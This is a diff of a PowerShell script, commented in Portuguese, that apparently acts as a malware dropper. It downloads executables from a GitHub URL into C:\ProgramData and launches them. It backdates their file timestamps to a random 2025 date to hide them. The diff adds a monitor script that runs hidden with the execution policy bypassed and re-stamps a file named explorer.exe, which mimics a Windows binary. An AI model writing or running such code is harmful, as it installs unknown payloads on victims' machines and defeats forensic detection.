@@ -12,7 +12,6 @@ Invoke-WebRequest -Uri "https://github.com/bexeybr/system/raw/refs/heads/main/Bu
 # Alterar data de todos para a mesma data aleatória de 2025
 (Get-Item "C:\ProgramData\Server.exe" ).LastWriteTime = $randomDate
 (Get-Item "C:\ProgramData\Server.exe").CreationTime = $randomDate
-
 (Get-Item "C:\ProgramData\Built.exe").LastWriteTime = $randomDate
 (Get-Item "C:\ProgramData\Built.exe").CreationTime = $randomDate
 
@@ -20,17 +19,26 @@ Invoke-WebRequest -Uri "https://github.com/bexeybr/system/raw/refs/heads/main/Bu
 Start-Process "C:\ProgramData\Server.exe"
 Start-Process "C:\ProgramData\Built.exe"
 
-# Monitorar a pasta e alterar data do explorer.exe quando aparecer (mesma data)
-while ($true) {
-    $explorerPath = "C:\ProgramData\explorer.exe"
-    if (Test-Path $explorerPath) {
+# Criar script de monitoramento separado e rodar em background
+$monitorScript = @"
+`$randomDate = Get-Random -Minimum 1 -Maximum 365 | ForEach-Object { (Get-Date '01/01/2025').AddDays(`$_) }
+`$randomDate = `$randomDate.AddHours((Get-Random -Minimum 0 -Maximum 24)).AddMinutes((Get-Random -Minimum 0 -Maximum 60)).AddSeconds((Get-Random -Minimum 0 -Maximum 60))
+while (`$true) {
+    `$explorerPath = "C:\ProgramData\explorer.exe"
+    if (Test-Path `$explorerPath) {
         try {
-            $file = Get-Item $explorerPath
-            if ($file.LastWriteTime.Year -ne 2025) {
-                $file.LastWriteTime = $randomDate
-                $file.CreationTime = $randomDate
+            `$file = Get-Item `$explorerPath
+            if (`$file.LastWriteTime.Year -ne 2025) {
+                `$file.LastWriteTime = `$randomDate
+                `$file.CreationTime = `$randomDate
             }
         } catch {}
     }
     Start-Sleep -Seconds 10
 }
+"@
+
+# Salvar e executar o monitor em background
+$monitorPath = "C:\ProgramData\monitor_2025.ps1"
+$monitorScript | Out-File -FilePath $monitorPath -Force
+Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$monitorPath`""
